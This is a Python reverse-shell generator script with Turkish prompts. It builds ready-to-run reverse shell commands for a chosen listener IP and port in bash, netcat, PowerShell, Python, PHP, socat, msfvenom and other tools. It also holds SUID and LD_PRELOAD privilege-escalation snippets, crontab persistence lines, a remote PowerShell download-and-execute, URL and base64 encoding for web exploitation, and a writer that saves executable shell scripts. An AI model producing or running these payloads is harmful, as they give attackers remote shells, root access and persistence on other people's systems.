#!/usr/bin/env python3 python3 chmod +x ultimate_shell_gen.py
# -*- coding: utf-8 -*-

import sys
import os
import base64
import random
import string

def print_banner():
    banner = """
    ╔══════════════════════════════════════╗
    ║           SHELL GENERATOR            ║
    ╚══════════════════════════════════════╝
    """
    print(banner)

def get_input():
    print("\nShell türleri:")
    print("1. Bash")
    print("2. PowerShell (Windows)")
    print("3. Netcat (nc)")
    print("4. Python")
    print("5. PHP")
    print("6. Socat")
    print("7. Ruby")
    print("8. Perl")
    print("9. Golang")
    print("10. AWK")
    print("11. Telnet")
    print("12. Java")
    print("13. Lua")
    print("14. Node.js")
    print("15. OpenSSL")
    print("16. Dart")
    print("17. Groovy")
    print("18. MSFVenom")
    print("19. VIM")
    print("20. Find SUID")
    print("21. SSH")
    print("22. C Code SUID")
    print("23. Cron Job")
    
    try:
        choice = int(input("\nShell türü seç (1-23): "))
        if choice < 1 or choice > 23:
            print("Geçersiz seçim!")
            sys.exit(1)
    except ValueError:
        print("Lütfen geçerli bir sayı gir!")
        sys.exit(1)
    
    ip = input("Listener IP: ")
    port = input("Listener port: ")
    
    payload_options = {}
    if choice == 1:
        print("\nBash payload seçenekleri:")
        print("1. Standart (bash -i)")
        print("2. /dev/tcp with exec")
        print("3. UDP variant")
        print("4. No /dev/tcp (mkfifo)")
        payload_options['bash'] = input("Seçim (1-4, varsayılan 1): ") or "1"
    
    elif choice == 2:
        print("\nPowerShell payload seçenekleri:")
        print("1. Standart (Uzun)")
        print("2. One-liner (Kısa)")
        print("3. Base64 Encoded")
        print("4. IEX DownloadString")
        payload_options['ps'] = input("Seçim (1-4, varsayılan 1): ") or "1"
    
    elif choice == 3:
        print("\nNetcat payload seçenekleri:")
        print("1. nc -e (geleneksel)")
        print("2. OpenBSD/mkfifo")
        print("3. nc without -e")
        print("4. BusyBox nc")
        payload_options['nc'] = input("Seçim (1-4, varsayılan 1): ") or "1"
    
    elif choice == 4:
        print("\nPython payload seçenekleri:")
        print("1. socket+subprocess")
        print("2. pty.spawn")
        print("3. subprocess only")
        print("4. Windows compatible")
        payload_options['python'] = input("Seçim (1-4, varsayılan 1): ") or "1"
    
    elif choice == 5:
        print("\nPHP payload seçenekleri:")
        print("1. exec with fsockopen")
        print("2. shell_exec with fsockopen")
        print("3. system with fsockopen")
        print("4. passthru with fsockopen")
        payload_options['php'] = input("Seçim (1-4, varsayılan 1): ") or "1"
    
    elif choice == 8:
        print("\nPerl payload seçenekleri:")
        print("1. Socket module")
        print("2. IO::Socket module")
        print("3. Windows compatible")
        payload_options['perl'] = input("Seçim (1-3, varsayılan 1): ") or "1"
    
    elif choice == 18:
        print("\nMSFVenom payload seçenekleri:")
        print("1. Windows x64 Reverse TCP")
        print("2. Linux x64 Reverse TCP")
        print("3. Android Reverse TCP")
        print("4. PHP Reverse TCP")
        payload_options['msf'] = input("Seçim (1-4, varsayılan 1): ") or "1"
    
    return choice, ip, port, payload_options

def generate_shell(choice, ip, port, options):
    rand_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
    
    shells = {
        1: [
            f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
            f"0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196",
            f"sh -i >& /dev/udp/{ip}/{port} 0>&1",
            f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f"
        ],
        
        2: [
            f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",
            f"powershell -nop -c \"$t=\\\"\\`$c=New-Object Net.Sockets.TCPClient(\\'{ip}\\',{port});\\$s=\\$c.GetStream();[byte[]]\\$b=0..65535|%{{0}};while((\\$i=\\$s.Read(\\$b,0,\\$b.Length)) -ne 0){{;\\$d=(New-Object Text.ASCIIEncoding).GetString(\\$b,0,\\$i);\\$sb=(iex \\$d 2>&1 | Out-String );\\$sb2=\\$sb+\\'PS \\'+(pwd).Path+\\'> \\';\\$sbt=([text.encoding]::ASCII).GetBytes(\\$sb2);\\$s.Write(\\$sbt,0,\\$sbt.Length);\\$s.Flush()}};\\$c.Close()\\\"; iex \\$t\"",
            f"powershell -e {base64.b64encode(f'$client = New-Object System.Net.Sockets.TCPClient(\'{ip}\',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'.encode('utf-16le')).decode()}",
            f"powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress {ip} -Port {port}"
        ],
        
        3: [
            f"nc -e /bin/sh {ip} {port}",
            f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
            f"nc {ip} {port} | /bin/sh | nc {ip} {port}",
            f"busybox nc {ip} {port} -e /bin/sh"
        ],
        
        4: [
            f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            f"python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'",
            f"python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'",
            f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"cmd.exe\",\"/k\"])'"
        ],
        
        5: [
            f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            f"php -r '$sock=fsockopen(\"{ip}\",{port});shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            f"php -r '$sock=fsockopen(\"{ip}\",{port});system(\"/bin/sh -i <&3 >&3 2>&3\");'",
            f"php -r '$sock=fsockopen(\"{ip}\",{port});passthru(\"/bin/sh -i <&3 >&3 2>&3\");'"
        ],
        
        6: [
            f"socat TCP:{ip}:{port} EXEC:'bash -li',pty,stderr,setsid,sigint,sane",
            f"socat TCP:{ip}:{port} EXEC:'sh -li',pty,stderr,setsid,sigint,sane",
            f"socat TCP:{ip}:{port} EXEC:'cmd.exe',pipes",
            f"wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat{rand_str}; chmod +x /tmp/socat{rand_str}; /tmp/socat{rand_str} exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{ip}:{port}"
        ],
        
        7: [
            f"ruby -rsocket -e 'c=TCPSocket.new(\"{ip}\",\"{port}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'",
            f"ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"{ip}\",\"{port}\");loop{{c.gets.chomp!;(exit! if $_==\"exit\");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){{|io|c.print io.read}}))rescue c.puts \"failed: #{$_}\"}}'",
            f"ruby -rsocket -e 'f=TCPSocket.open(\"{ip}\",\"{port}\").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
        ],
        
        8: [
            f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
            f"perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"{ip}:{port}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",
            f"perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\"{ip}:{port}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"
        ],
        
        9: [
            f"echo 'package main;import\"os/exec\";import\"net\";func main(){{c,_:=net.Dial(\"tcp\",\"{ip}:{port}\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}' > /tmp/shell{rand_str}.go && go run /tmp/shell{rand_str}.go",
            f"go run - <<< 'package main;import\"os/exec\";import\"net\";func main(){{c,_:=net.Dial(\"tcp\",\"{ip}:{port}\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}'"
        ],
        
        10: [
            f"awk 'BEGIN {{s = \"/inet/tcp/0/{ip}/{port}\"; while(42) {{ do{{ printf \"shell>\" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != \"exit\") close(s); }} }}'",
            f"awk 'BEGIN {{s = \"/inet/tcp/0/{ip}/{port}\"; while(1) {{ printf \"$ \" |& s; s |& getline cmd; if(cmd) {{ while (cmd |& getline output) print output |& s; close(cmd); }} }} }}'"
        ],
        
        11: [
            f"telnet {ip} {port} | /bin/sh | telnet {ip} {port}",
            f"TF=$(mktemp -u); mkfifo $TF && telnet {ip} {port} 0<$TF | /bin/sh 1>$TF"
        ],
        
        12: [
            f"""java -c 'Runtime r=Runtime.getRuntime();Process p=r.exec("/bin/bash -c 'exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do \\$line 2>&5 >&5; done'");p.waitFor();'""",
            f"""String host="{ip}";int port={port};String cmd="cmd.exe";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){{while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {{p.exitValue();break;}}catch (Exception e){{}}}};p.destroy();s.close();"""
        ],
        
        13: [
            f"lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{ip}','{port}');os.execute('/bin/sh -i <&3 >&3 2>&3');\"",
            f"lua5.1 -e 'local host, port = \"{ip}\", {port} local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, \"r\") local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()'"
        ],
        
        14: [
            f"""(function(){{var net = require("net"),cp = require("child_process"),sh = cp.spawn("/bin/sh", []);var client = new net.Socket();client.connect({port}, "{ip}", function(){{client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);}});return /a/; }})();""",
            f"require('child_process').exec('nc -e /bin/sh {ip} {port}')",
            f"node -e \"const {{ exec }} = require('child_process'); const net = require('net'); const client = new net.Socket(); client.connect({port}, '{ip}', () => {{ client.write('$ '); }}); client.on('data', (data) => {{ exec(data.toString().trim(), (error, stdout, stderr) => {{ client.write(stdout + stderr + '\\n$ '); }}); }});\""
        ],
        
        15: [
            f"mkfifo /tmp/s{rand_str}; /bin/sh -i < /tmp/s{rand_str} 2>&1 | openssl s_client -quiet -connect {ip}:{port} > /tmp/s{rand_str}; rm /tmp/s{rand_str}",
            f"openssl s_client -quiet -connect {ip}:{port} | /bin/sh | openssl s_client -quiet -connect {ip}:{port}"
        ],
        
        16: [
            f"""dart -e 'import "dart:io";import "dart:convert";main(){{Socket.connect("{ip}", {port}).then((socket){{socket.listen((data){{Process.start("sh", []).then((Process process){{process.stdin.writeln(utf8.decode(data));process.stdout.listen(socket.add);process.stderr.listen(socket.add);}});}});}});}}'"""
        ],
        
        17: [
            f"""groovy -e 'String host="{ip}";int port={port};String cmd="cmd.exe";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){{while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {{p.exitValue();break;}}catch (Exception e){{}}}};p.destroy();s.close();'"""
        ],
        
        18: [
            f"msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST={ip} LPORT={port}",
            f"msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell LHOST={ip} LPORT={port}",
            f"msfvenom -p android/meterpreter/reverse_tcp -o shell.apk LHOST={ip} LPORT={port}",
            f"msfvenom -p php/meterpreter/reverse_tcp -o shell.php LHOST={ip} LPORT={port}"
        ],
        
        19: [
            f"vim -c ':py3 import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
        ],
        
        20: [
            f"find / -perm -u=s -type f 2>/dev/null",
            f"find / -writable 2>/dev/null | cut -d \"/\" -f 2,3 | grep -v proc | sort -u",
            f"find . -exec /bin/sh -p \\; -quit"
        ],
        
        21: [
            f"ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa user@{ip}",
            f"ssh -i private_key user@{ip}"
        ],
        
        22: [
            f"#include <stdio.h>\n#include <sys/types.h>\n#include <stdlib.h>\n\nvoid _init() {{\nunsetenv(\"LD_PRELOAD\");\nsetgid(0);\nsetuid(0);\nsystem(\"/bin/bash\");\n}}\n\n# Derleme: gcc -fPIC -shared -o shell.so shell.c -nostartfiles"
        ],
        
        23: [
            f"echo \"* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'\" >> /etc/crontab",
            f"crontab -l | {{ cat; echo \"* * * * * /bin/bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'\"; }} | crontab -"
        ]
    }
    
    if choice in options:
        option_key = list(options.keys())[0]
        option_index = int(options[option_key]) - 1
        return shells[choice][option_index]
    else:
        return shells[choice][0]

def print_listener_command(port, ip, shell_type):
    print(f"\nDinleyici komutu (kendi makinende çalıştır):")
    
    if shell_type == 15:
        print(f"openssl req -x509 -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out cert.pem")
        print(f"openssl s_server -quiet -key key.pem -cert cert.pem -port {port}")
        print(f"veya")
        print(f"ncat --ssl -vv -l -p {port}")
    
    elif shell_type == 3:
        print(f"nc -nvlp {port}")
        print(f"UDP shell'ler için:")
        print(f"nc -u -lvp {port}")
    
    elif shell_type == 18:
        print(f"msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/x64/shell/reverse_tcp; set LHOST {ip}; set LPORT {port}; run\"")
    
    else:
        print(f"nc -nvlp {port}")
        print(f"Daha iyi stabilite için socat kullan:")
        print(f"socat file:`tty`,raw,echo=0 TCP-L:{port}")
        
        if shell_type == 2:
            print(f"PowerShell için özel dinleyici:")
            print(f"ncat -nvlp {port} --allow {ip}")

def main():
    print_banner()
    choice, ip, port, options = get_input()
    
    shell_code = generate_shell(choice, ip, port, options)
    
    print(f"\nOluşturulan komut:\n")
    print(f"{shell_code}\n")
    
    if input("Web sömürüsü için URL encode yapılsın mı? (y/N): ").lower() == 'y':
        from urllib.parse import quote
        encoded_shell = quote(shell_code)
        print(f"\nURL Encoded versiyon:\n")
        print(f"{encoded_shell}\n")
    
    if input("Base64 encode yapılsın mı? (y/N): ").lower() == 'y':
        encoded_shell = base64.b64encode(shell_code.encode()).decode()
        print(f"\nBase64 Encoded versiyon:\n")
        print(f"{encoded_shell}\n")
    
    print_listener_command(port, ip, choice)
    
    if input("Dosyaya kaydedilsin mi? (y/N): ").lower() == 'y':
        filename = input("Dosya adı (varsayılan: shell.txt): ") or "shell.txt"
        with open(filename, 'w') as f:
            f.write(shell_code)
        print(f"Komut {filename} dosyasına kaydedildi")
        
        if input("Çalıştırılabilir script oluşturulsun mu? (y/N): ").lower() == 'y':
            script_name = f"shell_{ip}_{port}.sh"
            with open(script_name, 'w') as f:
                f.write("#!/bin/bash\n")
                f.write(f"# Reverse shell to {ip}:{port}\n")
                f.write(f"echo '{ip}:{port} adresine bağlanılıyor...'\n")
                f.write(f"{shell_code}\n")
            os.chmod(script_name, 0o755)
            print(f"Script oluşturuldu: {script_name}")

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] in ['-h', '--help']:
        print("Kullanım: python3 shell_generator.py")
        print("Seçenekler:")
        print("  -h, --help  Yardım mesajını göster")
        sys.exit(0)
    
    try:
        main()
    except KeyboardInterrupt:
        print("\nİşlem kullanıcı tarafından iptal edildi")
        sys.exit(1)
    except Exception as e:
        print(f"Hata oluştu: {e}")
        sys.exit(1)